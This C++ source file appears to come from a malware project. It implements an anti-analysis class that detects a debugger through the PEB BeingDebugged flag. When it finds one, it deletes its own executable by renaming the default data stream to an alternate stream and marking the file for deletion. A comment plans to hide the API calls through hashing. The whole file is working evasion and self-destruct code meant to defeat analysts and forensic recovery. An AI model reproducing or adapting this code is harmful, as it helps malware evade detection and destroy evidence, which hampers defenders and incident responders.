#pragma once
#include "utils/headers/antianalysis.h"
#include "utils/headers/Tools.h"

#define NEW_STREAM L":a"

bool AntiAnalysis::Peb(API::APIResolver& resolver)
{
    PROCESS_BASIC_INFORMATION pbi;

    API::API_ACCESS api = resolver.GetAPIAccess();


    // Replace these functions with API hashed functions
    HANDLE  hProcess = GetCurrentProcess();

    if (api.func.pNtQueryInformationProcess)
    {
        ULONG returnLength;
        NTSTATUS status = api.func.pNtQueryInformationProcess(
            hProcess,
            ProcessBasicInformation,
            &pbi,
            sizeof(pbi),
            &returnLength
        );

        if (NT_SUCCESS(status))
        {
            if (pbi.PebBaseAddress && pbi.PebBaseAddress->BeingDebugged)
                return true;
        }
        else
        {
           // tools.ShowError("Failed with code: ", GetLastError());
            return false;
        }
    }
    else
    {
        //tools.ShowError("Failed to get NtQueryInformationProcess address");
    }

    return false;
}

bool AntiAnalysis::PebCheck(API::APIResolver& resolver)
{
    if (Peb(resolver)) {
        //MessageBoxA(NULL, "debugger", "debugger", NULL);
        this->Nuke();
    }
    return false;
}


int AntiAnalysis::Nuke(void)
{
    WCHAR                       szPath[MAX_PATH * 2] = { 0 };
    FILE_DISPOSITION_INFO       dispinfo = { 0 };
    HANDLE                      hFile = INVALID_HANDLE_VALUE;
    PFILE_RENAME_INFO           pRename = NULL;
    const wchar_t* NewStream = (const wchar_t*)NEW_STREAM;
    SIZE_T			            StreamLength = wcslen(NewStream) * sizeof(wchar_t);
    SIZE_T                      sRename = sizeof(FILE_RENAME_INFO) + StreamLength;

    pRename = (PFILE_RENAME_INFO)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sRename); // Allocate memory for structure

    if (!pRename) 
        return FALSE;
    
    ZeroMemory(szPath, sizeof(szPath));
    ZeroMemory(&dispinfo, sizeof(FILE_DISPOSITION_INFO));

    dispinfo.DeleteFile = TRUE; // Mark file for deletion

    // Setting the new data stream name buffer and size 
    pRename->FileNameLength = StreamLength;
    RtlCopyMemory(pRename->FileName, NewStream, StreamLength);

    // Get current file name
    if (GetModuleFileNameW(NULL, szPath, MAX_PATH * 2) == 0) 
        return FALSE;
    
    
    hFile = CreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL); // Open handle to current file

    if (hFile == INVALID_HANDLE_VALUE) 
        return FALSE;
    
    if (!SetFileInformationByHandle(hFile, FileRenameInfo, pRename, sRename))
        return FALSE;
    

    CloseHandle(hFile);

    // Open new handle
    hFile = CreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);

    if (hFile == INVALID_HANDLE_VALUE) 
        return FALSE;
    

    // Mark for deletion after file close
    if (!SetFileInformationByHandle(hFile, FileDispositionInfo, &dispinfo, sizeof(dispinfo))) 
        return FALSE;
    

    CloseHandle(hFile);
    HeapFree(GetProcessHeap(), 0, pRename);

    return TRUE;
}


